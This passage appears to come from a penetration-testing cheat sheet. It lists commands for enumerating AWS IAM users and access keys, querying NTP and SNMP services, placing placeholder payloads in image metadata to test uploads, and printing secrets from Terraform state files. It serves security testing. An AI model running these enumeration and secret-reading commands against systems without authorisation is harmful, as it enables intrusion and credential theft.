# including the user's creation date, path, unique ID, and ARN.
aws iam get-user --user-name "dom@righettod.eu"
aws iam get-user --user-name "dom@righettod.eu" | jq -r ".User.CreateDate"
# Returns information about the access key IDs associated with the specified IAM user
aws iam list-access-keys --user-name "dom@righettod.eu"
# Lists the names of the inline policies embedded in the specified IAM user.
aws iam list-user-policies --user-name "dom@righettod.eu"
# Lists the IAM users that have the specified path prefix.
aws iam list-users --path-prefix "/"
# Lists the virtual MFA devices defined in the Amazon Web Services account by assignment status.
aws iam list-virtual-mfa-devices
```

### Command "sts"

> 📖 [Documentation for this command](https://docs.aws.amazon.com/cli/latest/reference/sts/index.html).

```bash
# Returns details about the IAM user or role whose credentials are used to call the operation.
aws sts get-caller-identity
# Returns the account identifier for the specified access key ID.
aws sts get-access-key-info --access-key-id "XXX"
```

### Command "acm"

> 📖 [Documentation for this command](https://docs.aws.amazon.com/cli/latest/reference/acm/index.html).

```bash
# Returns the account configuration options associated with an Amazon Web Services account.
aws acm get-account-configuration
# Retrieves a list of certificate ARNs and domain names
aws acm list-certificates
```

### Command "kms"

> 📖 [Documentation for this command](https://docs.aws.amazon.com/cli/latest/reference/kms/index.html).

```bash
# Gets a list of all KMS keys in the caller's Amazon Web Services account and Region.
aws kms list-keys
```

## NTP

* [NTPQ reference](https://www.ntp.org/documentation/4.2.8-series/ntpq/).

💻 Install via:

* `apk add ntpsec` for Alpine.
* `apt install ntp` for Kali/Ubuntu/Debian.

💻 Commands:

```shell
# Get the list of commands supported
ntpq -c help [NTP_SERVER_IP_OR_HOSTNAME]
# Get the version of the NTP protocols supported
ntpq -c ntpversion [NTP_SERVER_IP_OR_HOSTNAME]
# Get the version of the NTP software in place
ntpq -c version [NTP_SERVER_IP_OR_HOSTNAME]
# Get list of the peers known to the server as well as a summary of their state
ntpq -c peers [NTP_SERVER_IP_OR_HOSTNAME]
# Get the type of OS used by the NTP server
ntpq -c "readvar 0 system" [NTP_SERVER_IP_OR_HOSTNAME]
```

## SNMP

* [Pentesting SNMP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp).
* [BRAA SNMP scanner](https://www.kali.org/tools/braa/).
* [Snmpcheck](https://www.kali.org/tools/snmpcheck/).
<!-- markdown-link-check-disable-next-line -->
* [OID repository](http://oid-info.com/get/1.3.6.1.2.1.1.5).

💡 Kali usage is recommanded, as **braa** and **snmp-mibs-downloader**, are not available on Alpine.

💻 Install via `apt install snmp snmpcheck snmp-mibs-downloader perl-tk libterm-readkey-perl braa`.

📍 Notes:

* After the installation, comment the line saying `mibs :` in file `/etc/snmp/snmp.conf`.
* **snmp-check** and **braa** only supports the version **1** and **2c** of SNMP.

💻 Commands:

```shell
# Test if the remote service is reachable
## Test with SNMP version 1
snmp-check -c public -v 1 [SNMP_SERVER_IP_OR_HOSTNAME]
## Test with SNMP version 2c
snmp-check -c public -v 2c [SNMP_SERVER_IP_OR_HOSTNAME]
# Get initial set of information
## Test with SNMP version 1: Use "snmpget" because bulk commands are specific of snmp v2 and up
snmpget -v1 -c public [SNMP_SERVER_IP_OR_HOSTNAME] .1.3.6.1.2.1.1.5
## Test with SNMP version 2c
snmpbulkwalk -c public -v 2c [SNMP_SERVER_IP_OR_HOSTNAME] .
## Test with SNMP version 3
snmpbulkwalk -v 3 [SNMP_SERVER_IP_OR_HOSTNAME] .
# Same than above with "braa"
## Test with SNMP version 1
braa public@[SNMP_SERVER_IP_OR_HOSTNAME]:.1.3.6.*
## Test with SNMP version 2c
braa -2 public@[SNMP_SERVER_IP_OR_HOSTNAME]:.1.3.6.*
```

## Test files to evaluate a file upload feature

> 📦 [My collection of sample files](../README.md#misc).

* [Image payload creating/injecting tools](https://github.com/sighook/pixload).
* [Exiftool command examples](https://exiftool.org/examples.html).
* [List of image official mime types](https://www.iana.org/assignments/media-types/media-types.xhtml#image).

💻 Exiftool commands to add payload to a image file:

```shell
# Add a payload in the "Comment" tag of a JPG image
$ exiftool -comment="PAYLOAD" test.jpg
# Add a payload in the "Artist" tag of a JPG image
$ exiftool -artist="PAYLOAD" test.jpg
# Add a payload in the "Software" tag of a JPG image
$ exiftool -software="PAYLOAD" test.jpg
```

## Terraform

* [CLI reference](https://developer.hashicorp.com/terraform/cli).

💡 Each time a Terraform application is run, a backup is made in a file having this format `terraform.tfstate.[timestamp]`.

💻 Commands:

```shell
# Display the content of the specified state file
$ terraform show -state=/tmp/terraform.tfstate
# Display the secret contained into the specified state file
$ terraform output secret -raw -state=/tmp/terraform.tfstate
```
